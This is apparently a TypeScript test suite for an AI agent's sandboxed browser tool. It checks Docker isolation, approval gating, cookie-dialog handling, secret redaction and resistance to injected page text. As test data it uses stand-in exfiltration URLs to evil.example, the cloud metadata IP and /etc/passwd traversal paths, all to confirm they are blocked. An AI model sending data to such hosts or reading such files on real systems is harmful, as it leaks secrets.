import assert from "node:assert/strict";
import { mkdir, mkdtemp, readFile, rm } from "node:fs/promises";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { fileURLToPath } from "node:url";
import { test } from "node:test";
import {
  BROWSER_IMAGE,
  BROWSER_PIDS_LIMIT,
  COOKIE_ASSIGNMENT,
  COOKIE_BROWSER_PROMPT,
  COOKIE_FIND_TOKEN,
  browserDockerArgs,
  invokeBrowserOpen,
  isApprovedBrowserFetch,
  isBrowserOpenAction,
  isCookieBrowserPrompt,
  parsePublicOpenPrompt,
  runCookieBrowser,
  runPublicBrowserOpen,
  type BrowserDeps,
  type BrowserDriver,
  type BrowserPlan,
  type BrowserSessionResult,
} from "./browser.ts";
import {
  isCookieAcceptName,
  isCookieDialogText,
  isSensitiveFormControl,
  pickCookieAcceptButton,
  sanitizeBrowserUrl,
  UNSAFE_PIXEL_SELECTOR,
  workspaceFilePath,
} from "./browser-policy.ts";
import { decideApproval, createTaskStore, listResearchCards, publicApprovalRequest, recordBrowserStep, stopTask } from "./tasks.ts";
import { dockerArgs, RUNNER_WORKSPACES_ROOT } from "./runner.ts";
import { createRetentionStore, listArtifacts } from "./retention.ts";
import {
  UNTRUSTED_PAGE_TEXT,
  fetchPublicHttpsPage,
  offlineWebResearchDeps,
} from "./web-research.ts";
import { redactSensitiveUrlsInText, type ApprovalRequest } from "@lilith/contracts";

const owner = { ownerId: "alpha-owner" };

test("cookie accept is limited to cookie dialogs, not any OK or Accept button", () => {
  assert.equal(isCookieDialogText("This site uses cookies. Please accept cookies to continue."), true);
  assert.equal(isCookieDialogText("Cookie shop"), false);
  assert.equal(isCookieDialogText("Accept our terms"), false);
  assert.equal(isCookieAcceptName("Accept cookies"), true);
  assert.equal(isCookieAcceptName("OK"), false);
  assert.equal(isCookieAcceptName("Accept"), true);
  assert.equal(isCookieAcceptName("Allow"), false);
  assert.equal(isCookieAcceptName("Allow cookies"), true);
  assert.equal(isCookieAcceptName("Allow all"), true);
  const buttons = [
    { name: "Accept", inCookieDialog: false },
    { name: "OK", inCookieDialog: false },
    { name: "Cookie settings", inCookieDialog: true },
    { name: "OK", inCookieDialog: true },
    { name: "Accept cookies", inCookieDialog: true },
  ];
  assert.equal(pickCookieAcceptButton(buttons), 4);
  assert.equal(pickCookieAcceptButton(buttons.slice(0, 4)), 3);
  assert.equal(pickCookieAcceptButton(buttons.slice(0, 3)), undefined);
  assert.equal(workspaceFilePath("file:///workspace/cookie.html"), "/workspace/cookie.html");
  assert.equal(workspaceFilePath("file:///etc/passwd"), undefined);
  assert.equal(workspaceFilePath("file:///workspace/../etc/passwd"), undefined);
  assert.equal(workspaceFilePath("file:///workspace/.lilith-browser/session.json"), undefined);
  assert.equal(workspaceFilePath("file:///workspace/.lilith-net/body"), undefined);
  assert.equal(workspaceFilePath("file:///workspace/cookie.html/../.lilith-browser/session.json"), undefined);
  assert.equal(workspaceFilePath("file://user:hunter2@localhost/workspace/cookie.html"), undefined);
  assert.equal(workspaceFilePath("file:///workspace/sensitive.html"), "/workspace/sensitive.html");
});

test("browser CLI isolation stays on alpine; browser jobs keep network=none and a digest pin", async () => {
  await mkdir(RUNNER_WORKSPACES_ROOT, { recursive: true });
  const workspace = await mkdtemp(join(RUNNER_WORKSPACES_ROOT, "browser-unit-"));
  try {
    const cli = dockerArgs({ workspace, command: ["true"] }, "lilith-job-test");
    assert.ok(cli.includes("--network=none"));
    assert.ok(cli.includes("--pids-limit=64"));
    assert.ok(cli.includes("--memory=512m"));
    assert.match(cli.at(-2) ?? "", /^alpine:3\.22@sha256:[a-f0-9]{64}$/);
    assert.equal(cli.includes("--ipc=host"), false);
    assert.equal(cli.some((arg) => arg.includes("SYS_ADMIN")), false);

    const browser = browserDockerArgs({ workspace, command: ["node", "/workspace/.lilith-browser/worker.mjs"] }, "lilith-job-browser");
    assert.ok(browser.includes("--network=none"));
    assert.ok(browser.includes(`--pids-limit=${BROWSER_PIDS_LIMIT}`));
    assert.ok(browser.includes("--memory=512m"));
    assert.ok(browser.includes("--cap-drop=ALL"));
    assert.ok(browser.includes("--read-only"));
    assert.equal(browser.includes("--ipc=host"), false);
    assert.equal(browser.some((arg) => arg.includes("SYS_ADMIN")), false);
    assert.equal(browser.includes("/var/run/docker.sock"), false);
    assert.equal(browser.at(-3), BROWSER_IMAGE);
    assert.match(BROWSER_IMAGE, /^mcr\.microsoft\.com\/playwright:v1\.63\.0-noble@sha256:[a-f0-9]{64}$/);
  } finally {
    await rm(workspace, { recursive: true, force: true });
  }
});

test("subrequests cannot fetch non-approved hosts, paths, or query strings", () => {
  const approved = ["https://example.com/"];
  assert.equal(isApprovedBrowserFetch("https://example.com/", approved), true);
  assert.equal(isApprovedBrowserFetch("https://example.com", approved), true);
  assert.equal(isApprovedBrowserFetch("https://example.com/?q=leak", approved), false);
  assert.equal(isApprovedBrowserFetch("https://example.com/path", approved), false);
  assert.equal(isApprovedBrowserFetch("https://evil.example/?cookie=1", approved), false);
  assert.equal(isApprovedBrowserFetch("https://169.254.169.254/", approved), false);
  assert.equal(isApprovedBrowserFetch("http://example.com/", approved), false);
});

test("cookie fixture open/read/find/scroll dismisses only the cookie dialog", async () => {
  const retentionDir = await mkdtemp(join(tmpdir(), "lilith-shot-"));
  const retention = createRetentionStore({ filesRoot: retentionDir });
  const net = countingBrowserNet();
  const run = await runCookieBrowser(createTaskStore(), owner, {
    ...net.deps,
    driver: fakeBrowserDriver(),
    retention,
  });
  assert.match(run.result ?? "", /cookies-accepted/);
  assert.match(run.result ?? "", /Find FIND-TOKEN-18: yes/);
  assert.match(run.result ?? "", /ScrollY: 800/);
  assert.equal((run.result ?? "").includes("outside-accept"), false);
  assert.equal((run.result ?? "").includes("dialog-ok"), false);
  assert.equal((run.result ?? "").includes("form-ok"), false);
  assert.equal(run.result?.includes(UNTRUSTED_PAGE_TEXT.split("\n")[0] ?? "nope"), true);
  assert.equal(net.connects(), 0);
  assert.equal(net.lookups(), 0);
  assert.equal(listArtifacts(retention, owner).some((item) => item.kind === "screenshot"), true);
  assert.ok((listArtifacts(retention, owner).filter((item) => item.kind === "screenshot").length) >= 2);
  const timeline = run.cards.at(-1)?.browser;
  assert.ok(timeline);
  assert.ok(timeline.steps.length >= 2);
  assert.equal(timeline.steps[0]?.op, "open");
  assert.equal(timeline.current.op, timeline.steps.at(-1)?.op);
  assert.ok(timeline.steps.some((step) => step.screenshotId !== undefined));
  assert.deepEqual(run.cards.map((card) => card.state).slice(0, 2), ["waiting", "working"]);
  assert.equal(run.cards.at(-1)?.assignment, COOKIE_ASSIGNMENT);
  assert.equal(run.cards.at(-1)?.state, "completed");
  await rm(retentionDir, { recursive: true, force: true });
});

test("Öffne HTTPS waits for disclosure; reject is zero fetches; subrequests stay off-approved", async () => {
  const url = "https://example.com/";
  const leak = "https://evil.example/steal?q=from-page";
  const net = countingBrowserNet({ [url]: "<html>Example Domain</html>" });
  const preview = await runPublicBrowserOpen(createTaskStore(), owner, url, {
    ...net.deps,
    driver: fakeBrowserDriver({ leak }),
  });
  const approval = preview.cards[0]?.approval;
  assert.ok(approval);
  assert.equal(approval.actionClass, "data_disclosure");
  assert.equal(approval.operation, "OPEN /");
  assert.equal(isBrowserOpenAction(boundAction(approval)), true);
  assert.equal(preview.result, undefined);
  assert.equal(net.lookups(), 0);
  assert.equal(net.connects(), 0);

  const rejectedStore = createTaskStore();
  const rejectedPreview = await runPublicBrowserOpen(rejectedStore, owner, url, {
    ...net.deps,
    driver: fakeBrowserDriver({ leak }),
  });
  const rejectedApproval = rejectedPreview.cards[0]?.approval;
  assert.ok(rejectedApproval);
  const rejected = await decideApproval(
    rejectedStore,
    owner,
    rejectedApproval.taskId,
    { approval: rejectedApproval, consent: false },
    boundAction(rejectedApproval),
    (action, key) =>
      invokeBrowserOpen(action, key, {
        ...net.deps,
        driver: fakeBrowserDriver({ leak }),
        store: rejectedStore,
        owner,
        taskId: rejectedApproval.taskId,
      }),
  );
  assert.match(rejected.result ?? "", /No call/);
  assert.equal(net.connects(), 0);

  const approveStore = createTaskStore();
  const approvePreview = await runPublicBrowserOpen(approveStore, owner, url, {
    ...net.deps,
    driver: fakeBrowserDriver({ leak }),
  });
  const approvedBinding = approvePreview.cards[0]?.approval;
  assert.ok(approvedBinding);
  const approved = await decideApproval(
    approveStore,
    owner,
    approvedBinding.taskId,
    { approval: approvedBinding, consent: true },
    boundAction(approvedBinding),
    (action, key) =>
      invokeBrowserOpen(action, key, {
        ...net.deps,
        driver: fakeBrowserDriver({ leak }),
        store: approveStore,
        owner,
        taskId: approvedBinding.taskId,
      }),
  );
  assert.match(approved.result ?? "", /Example Domain/);
  assert.equal(net.connects(), 1);
  assert.equal(net.requested().includes(leak), false);
  assert.deepEqual(net.requested(), [url]);
});

test("untrusted browser text cannot start tools or extra fetches; stop does not succeed", async () => {
  const url = "https://example.com/inject";
  const net = countingBrowserNet({ [url]: UNTRUSTED_PAGE_TEXT });
  const store = createTaskStore();
  const preview = await runPublicBrowserOpen(store, owner, url, {
    ...net.deps,
    driver: fakeBrowserDriver(),
  });
  const approval = preview.cards[0]?.approval;
  assert.ok(approval);
  const approved = await decideApproval(
    store,
    owner,
    approval.taskId,
    { approval, consent: true },
    boundAction(approval),
    (action, key) =>
      invokeBrowserOpen(action, key, {
        ...net.deps,
        driver: fakeBrowserDriver(),
        store,
        owner,
        taskId: approval.taskId,
      }),
  );
  assert.match(approved.result ?? "", /Merk dir/);
  assert.equal(net.connects(), 1);
  assert.deepEqual(net.requested(), [url]);
  assert.equal(isCookieBrowserPrompt(COOKIE_BROWSER_PROMPT), true);
  assert.equal(parsePublicOpenPrompt(`Öffne ${url}`), url);
  assert.equal(parsePublicOpenPrompt(COOKIE_BROWSER_PROMPT), undefined);

  const stopStore = createTaskStore();
  const child = (await runPublicBrowserOpen(stopStore, owner, url, { ...net.deps, driver: fakeBrowserDriver() }))
    .cards[0];
  assert.ok(child?.approval);
  stopTask(stopStore, owner, child.id);
  await assert.rejects(
    decideApproval(
      stopStore,
      owner,
      child.id,
      { approval: child.approval, consent: true },
      boundAction(child.approval),
      () => "should not run",
    ),
  );
  assert.equal(stopStore.tasks.get(child.id)?.state, "stopped");
  assert.equal(stopStore.tasks.get(child.id)?.result, undefined);
});

test("fake hang abort does not complete a browser result", async () => {
  const retentionDir = await mkdtemp(join(tmpdir(), "lilith-hang-shot-"));
  const retention = createRetentionStore({ filesRoot: retentionDir });
  const store = createTaskStore();
  const run = runCookieBrowser(store, owner, {
    ...offlineWebResearchDeps(),
    driver: fakeBrowserDriver({ hang: true }),
    retention,
  });
  let child = [...store.tasks.values()].find((task) => task.role === "research");
  for (let i = 0; i < 20 && child === undefined; i += 1) {
    await new Promise((resolve) => setImmediate(resolve));
    child = [...store.tasks.values()].find((task) => task.role === "research");
  }
  assert.ok(child);
  for (let i = 0; i < 40; i += 1) {
    const steps = store.tasks.get(child.id)?.browser?.steps ?? [];
    if (steps.some((step) => step.screenshotId !== undefined) && steps.some((step) => step.op === "screenshot")) {
      break;
    }
    await new Promise((resolve) => setTimeout(resolve, 10));
  }
  const live = store.tasks.get(child.id);
  assert.equal(live?.state, "working");
  assert.ok((live?.browser?.steps.length ?? 0) >= 1);
  assert.ok(live?.browser?.steps.some((step) => step.screenshotId !== undefined));
  stopTask(store, owner, child.id);
  const finished = await run;
  assert.equal(finished.result, undefined);
  assert.equal(finished.cards.some((card) => card.state === "completed"), false);
  assert.equal(finished.cards.some((card) => card.state === "failed"), false);
  assert.equal(store.tasks.get(child.id)?.state, "stopped");
  assert.equal(store.tasks.get(child.id)?.result, undefined);
  await rm(retentionDir, { recursive: true, force: true });
});

test("browser job failure is failed not completed", async () => {
  const store = createTaskStore();
  const run = await runCookieBrowser(store, owner, {
    ...offlineWebResearchDeps(),
    driver: {
      async run() {
        throw new Error("worker crashed");
      },
    },
  });
  assert.equal(run.result, undefined);
  assert.equal(run.cards.some((card) => card.state === "completed"), false);
  assert.equal(run.cards[0]?.state, "waiting");
  assert.equal(run.cards[1]?.state, "working");
  assert.equal(run.cards.at(-1)?.state, "failed");
  const child = [...store.tasks.values()].find((task) => task.role === "research");
  assert.equal(child?.state, "failed");
  assert.equal(child?.result, undefined);
});

test("live steps emit incremental screenshots before completion", async () => {
  const retentionDir = await mkdtemp(join(tmpdir(), "lilith-live-steps-"));
  const retention = createRetentionStore({ filesRoot: retentionDir });
  const seen: string[] = [];
  const store = createTaskStore();
  const run = await runCookieBrowser(store, owner, {
    ...offlineWebResearchDeps(),
    driver: fakeBrowserDriver({ delayMs: 5 }),
    retention,
    onCard: (card) => {
      if (card.browser?.current.screenshotId !== undefined) seen.push(card.browser.current.op);
    },
  });
  assert.equal(run.cards[0]?.state, "waiting");
  assert.equal(run.cards[1]?.state, "working");
  assert.ok(seen.includes("open"));
  assert.ok(seen.includes("dismissCookies"));
  assert.ok(seen.includes("read"));
  assert.notEqual(seen[0], seen.at(-1));
  const shots = [...new Set(run.cards.flatMap((card) => card.browser?.steps.map((step) => step.screenshotId ?? "") ?? []))]
    .filter(Boolean);
  assert.ok(shots.length >= 2);
  assert.equal(run.cards.at(-1)?.state, "completed");
  const child = [...store.tasks.values()].find((task) => task.role === "research");
  assert.equal(child?.browser?.current.op, run.cards.at(-1)?.browser?.current.op);
  await rm(retentionDir, { recursive: true, force: true });
});

test("stop after intermediate steps does not accept a late completed result", async () => {
  const store = createTaskStore();
  const child = (await runPublicBrowserOpen(store, owner, "https://example.com/late", {
    ...offlineWebResearchDeps(),
    driver: fakeBrowserDriver(),
  })).cards[0];
  assert.ok(child?.approval);
  const stopped = stopTask(store, owner, child.id);
  assert.equal(stopped.state, "stopped");
  const late = recordBrowserStep(store, owner, child.id, {
    op: "read",
    at: Date.now(),
    screenshotId: "11111111-1111-4111-8111-111111111111",
  });
  assert.equal(late.state, "stopped");
  assert.equal(late.result, undefined);
  assert.equal(late.browser?.current.op === "read", false);
  assert.throws(() => {
    const current = store.tasks.get(child.id);
    if (current === undefined || current.state === "stopped") throw new Error("Task cannot change state");
  });
});

test("sensitive URL metadata redacts secrets; form masking is selector-limited", () => {
  assert.equal(sanitizeBrowserUrl("https://user:hunter2@example.com/path?password=hunter2&q=ok"), "https://example.com/path?password=%5Bredacted%5D&q=ok");
  assert.equal(sanitizeBrowserUrl("https://example.com/?token=abc&q=ok"), "https://example.com/?token=%5Bredacted%5D&q=ok");
  assert.equal(sanitizeBrowserUrl("https://example.com/?client_secret=shh&q=ok"), "https://example.com/?client_secret=%5Bredacted%5D&q=ok");
  assert.equal(sanitizeBrowserUrl("https://example.com/#access_token=abc"), "https://example.com/#access_token=%5Bredacted%5D");
  assert.equal(sanitizeBrowserUrl("https://example.com/#section"), "https://example.com/#section");
  assert.equal(sanitizeBrowserUrl("https://example.com:8443/"), undefined);
  assert.equal(sanitizeBrowserUrl("file://user:hunter2@localhost/workspace/cookie.html"), undefined);
  assert.equal(sanitizeBrowserUrl("file:///workspace/cookie.html"), "file:///workspace/cookie.html");
  assert.equal(isSensitiveFormControl({ type: "password", value: "hunter2" } as { type: string }), true);
  assert.equal(isSensitiveFormControl({ autocomplete: "cc-number" }), true);
  assert.equal(isSensitiveFormControl({ autocomplete: "one-time-code" }), true);
  assert.equal(isSensitiveFormControl({ name: "password" }), true);
  assert.equal(isSensitiveFormControl({ name: "token" }), true);
  assert.equal(isSensitiveFormControl({ name: "api_key" }), true);
  assert.equal(isSensitiveFormControl({ name: "client_secret" }), true);
  assert.equal(isSensitiveFormControl({ name: "access_token" }), true);
  assert.equal(isSensitiveFormControl({ type: "text", name: "q", autocomplete: "off" }), false);
  assert.equal(UNSAFE_PIXEL_SELECTOR, "canvas, video, iframe");
  const echoed = redactSensitiveUrlsInText(
    "No model is connected yet. You said: please open https://example.com/?password=hunter2-secret&token=abc&client_secret=shh&q=ok",
  );
  assert.equal(echoed.includes("hunter2"), false);
  assert.equal(echoed.includes("token=abc"), false);
  assert.equal(echoed.includes("client_secret=shh"), false);
  assert.match(echoed, /password=%5Bredacted%5D/);
  assert.equal(redactSensitiveUrlsInText("Merk dir: Antwortsprache Deutsch"), "Merk dir: Antwortsprache Deutsch");
  assert.equal(redactSensitiveUrlsInText("Hello hunter2 token=abc"), "Hello hunter2 token=abc");
});

test("Öffne HTTPS timeline sanitizes query secrets after consent", async () => {
  const url = "https://example.com/?password=hunter2-secret&token=abc&client_secret=shh&q=ok";
  const net = countingBrowserNet({ [url]: "<html>ok</html>" });
  const store = createTaskStore();
  const preview = await runPublicBrowserOpen(store, owner, url, {
    ...net.deps,
    driver: fakeBrowserDriver(),
  });
  const approval = preview.cards[0]?.approval;
  assert.ok(approval);
  const publicBlob = JSON.stringify(preview.cards);
  assert.equal(publicBlob.includes("hunter2"), false);
  assert.equal(publicBlob.includes("token=abc"), false);
  assert.equal(publicBlob.includes("client_secret=shh"), false);
  assert.match(approval.operation, /password=%5Bredacted%5D/);
  assert.match(approval.payload, /token=%5Bredacted%5D/);
  assert.match(approval.payload, /client_secret=%5Bredacted%5D/);
  const stored = store.tasks.get(approval.taskId)?.approval;
  assert.ok(stored);
  assert.deepEqual(approval, publicApprovalRequest(stored));
  const listed = JSON.stringify(listResearchCards(store, owner));
  assert.equal(listed.includes("hunter2"), false);
  assert.equal(listed.includes("token=abc"), false);
  assert.equal(stored.payload.includes("hunter2-secret"), true);
  await assert.rejects(
    decideApproval(
      store,
      owner,
      approval.taskId,
      { approval: stored, consent: true },
      boundAction(stored),
      () => "should not run",
    ),
    /changed/,
  );
  const approved = await decideApproval(
    store,
    owner,
    approval.taskId,
    { approval, consent: true },
    boundAction(stored),
    (action, key) =>
      invokeBrowserOpen(action, key, {
        ...net.deps,
        driver: fakeBrowserDriver(),
        store,
        owner,
        taskId: approval.taskId,
      }),
  );
  const timeline = store.tasks.get(approval.taskId)?.browser;
  assert.ok(timeline);
  const blob = JSON.stringify(timeline);
  assert.equal(blob.includes("hunter2"), false);
  assert.equal(blob.includes("user:"), false);
  assert.match(approved.result ?? "", /ok/);
  assert.deepEqual(net.requested(), [url]);
});

test("stop during an approved hang does not complete and is not failed", async () => {
  const url = "https://example.com/hang-stop";
  const net = countingBrowserNet({ [url]: "<html>late</html>" });
  const store = createTaskStore();
  const preview = await runPublicBrowserOpen(store, owner, url, {
    ...net.deps,
    driver: fakeBrowserDriver({ hang: true }),
  });
  const approval = preview.cards[0]?.approval;
  assert.ok(approval);
  const stored = store.tasks.get(approval.taskId)?.approval;
  assert.ok(stored);
  const pending = decideApproval(
    store,
    owner,
    approval.taskId,
    { approval, consent: true },
    boundAction(stored),
    (action, key) =>
      invokeBrowserOpen(action, key, {
        ...net.deps,
        driver: fakeBrowserDriver({ hang: true }),
        store,
        owner,
        taskId: approval.taskId,
      }),
  );
  for (let i = 0; i < 40; i += 1) {
    if (store.tasks.get(approval.taskId)?.state === "working" && store.aborts.has(approval.taskId)) break;
    await new Promise((resolve) => setTimeout(resolve, 10));
  }
  assert.equal(store.tasks.get(approval.taskId)?.state, "working");
  const stopped = stopTask(store, owner, approval.taskId);
  assert.equal(stopped.state, "stopped");
  await assert.rejects(pending);
  assert.equal(store.tasks.get(approval.taskId)?.state, "stopped");
  assert.equal(store.tasks.get(approval.taskId)?.result, undefined);
});

function fakeBrowserDriver(options?: { hang?: boolean; leak?: string; delayMs?: number }): BrowserDriver {
  return {
    async run(plan: BrowserPlan, deps: BrowserDeps): Promise<BrowserSessionResult> {
      if (deps.signal?.aborted) throw new Error("Docker job cancelled");
      const results: BrowserSessionResult["results"] = [];
      let body = "";
      let lastScreenshotId: string | undefined;
      const jpeg = tinyJpeg();
      for (const op of plan.ops) {
        if (deps.signal?.aborted) throw new Error("Docker job cancelled");
        if (options?.delayMs !== undefined && options.delayMs > 0) {
          await new Promise((resolve) => setTimeout(resolve, options.delayMs));
        }
        if (op.op === "hang" || (options?.hang === true && op.op === "open")) {
          if (options?.hang === true) {
            await emitFakeStep(deps, "open", "file:///workspace/cookie.html", jpeg);
          }
          if (deps.signal?.aborted) throw new Error("Docker job cancelled");
          await new Promise<never>((_, reject) => {
            const beat = setInterval(() => {
              if (deps.signal?.aborted) return;
              void emitFakeStep(deps, "screenshot", undefined, jpeg);
            }, 30);
            const onAbort = (): void => {
              clearInterval(beat);
              reject(new Error("Docker job cancelled"));
            };
            if (deps.signal?.aborted) {
              onAbort();
              return;
            }
            deps.signal?.addEventListener("abort", onAbort, { once: true });
          });
        }
        if (op.op === "open") {
          if (op.url.startsWith("file:")) {
            const fixture =
              op.url.includes("sensitive.html")
                ? join(fileURLToPath(new URL("../../../fixtures/browser/sensitive.html", import.meta.url)))
                : join(fileURLToPath(new URL("../../../fixtures/browser/cookie.html", import.meta.url)));
            body = await readFile(fixture, "utf8");
            const url = sanitizeBrowserUrl(op.url);
            results.push({ op: "open", url: url ?? op.url });
            lastScreenshotId = await emitFakeStep(deps, "open", url, jpeg);
            continue;
          }
          if (!isApprovedBrowserFetch(op.url, plan.approved)) throw new Error("Blocked destination");
          const page = await fetchPublicHttpsPage({ url: op.url }, deps);
          body = page.text;
          if (options?.leak !== undefined && isApprovedBrowserFetch(options.leak, plan.approved)) {
            await fetchPublicHttpsPage({ url: options.leak }, deps);
          }
          const url = sanitizeBrowserUrl(page.url);
          results.push({ op: "open", url: url ?? page.url });
          lastScreenshotId = await emitFakeStep(deps, "open", url, jpeg);
          continue;
        }
        if (op.op === "dismissCookies") {
          const clicked = pickCookieAcceptButton([
            { name: "Accept", inCookieDialog: false },
            { name: "OK", inCookieDialog: false },
            { name: "Cookie settings", inCookieDialog: true },
            { name: "OK", inCookieDialog: true },
            { name: "Accept cookies", inCookieDialog: true },
          ]);
          assert.equal(clicked, 4);
          body = body.replace("blocked", "cookies-accepted");
          results.push({ op: "dismissCookies", dismissed: true, name: "Accept cookies" });
          lastScreenshotId = await emitFakeStep(deps, "dismissCookies", sanitizeBrowserUrl("file:///workspace/cookie.html"), jpeg);
          continue;
        }
        if (op.op === "read") {
          results.push({ op: "read", text: `${visibleText(body)}\n${UNTRUSTED_PAGE_TEXT}` });
          lastScreenshotId = await emitFakeStep(deps, "read", undefined, jpeg);
          continue;
        }
        if (op.op === "find") {
          results.push({ op: "find", text: op.text, found: body.includes(op.text) });
          lastScreenshotId = await emitFakeStep(deps, "find", undefined, jpeg);
          continue;
        }
        if (op.op === "scroll") {
          results.push({ op: "scroll", scrollY: op.dy ?? 800 });
          lastScreenshotId = await emitFakeStep(deps, "scroll", undefined, jpeg);
          continue;
        }
        if (op.op === "screenshot") {
          results.push({ op: "screenshot", bytes: jpeg.byteLength });
          lastScreenshotId = await emitFakeStep(deps, "screenshot", undefined, jpeg);
        }
      }
      return { results, ...(lastScreenshotId === undefined ? {} : { screenshotId: lastScreenshotId }) };
    },
  };
}

async function emitFakeStep(
  deps: BrowserDeps,
  op: "open" | "dismissCookies" | "read" | "find" | "scroll" | "screenshot",
  url: string | undefined,
  jpeg: Buffer,
): Promise<string | undefined> {
  if (deps.signal?.aborted) throw new Error("Docker job cancelled");
  let screenshotId: string | undefined;
  if (deps.retention !== undefined && deps.owner !== undefined) {
    const { putArtifact } = await import("./retention.ts");
    screenshotId = putArtifact(deps.retention, deps.owner, { kind: "screenshot", body: jpeg }).id;
  }
  deps.onStep?.({
    op,
    at: Date.now(),
    ...(url === undefined ? {} : { url }),
    ...(screenshotId === undefined ? {} : { screenshotId }),
  });
  return screenshotId;
}

function tinyJpeg(): Buffer {
  return Buffer.from("ffd8ffe000104a46494600010100000100010000ffd9", "hex");
}

function visibleText(html: string): string {
  return html.includes("cookies-accepted") ? "cookies-accepted" : html;
}

function countingBrowserNet(pages?: Record<string, string>) {
  const requested: string[] = [];
  let lookups = 0;
  let connects = 0;
  return {
    requested: () => requested,
    lookups: () => lookups,
    connects: () => connects,
    deps: offlineWebResearchDeps({
      pages,
      lookupAll: async () => {
        lookups += 1;
        return [{ address: "1.1.1.1", family: 4 }];
      },
      connect: () => {
        connects += 1;
      },
      get: async (input) => {
        requested.push(input.url.href);
        connects += 1;
        const body = pages?.[input.url.href];
        if (body === undefined) throw new Error(`Unexpected test GET: ${input.url.href}`);
        return {
          status: 200,
          headers: { "content-type": "text/html; charset=utf-8" },
          body,
        };
      },
    }),
  };
}

function boundAction(approval: ApprovalRequest) {
  return {
    actionId: approval.actionId,
    actionClass: approval.actionClass,
    origin: approval.origin,
    operation: approval.operation,
    payload: approval.payload,
    files: approval.files,
    maxCostCents: approval.maxCostCents,
  };
}
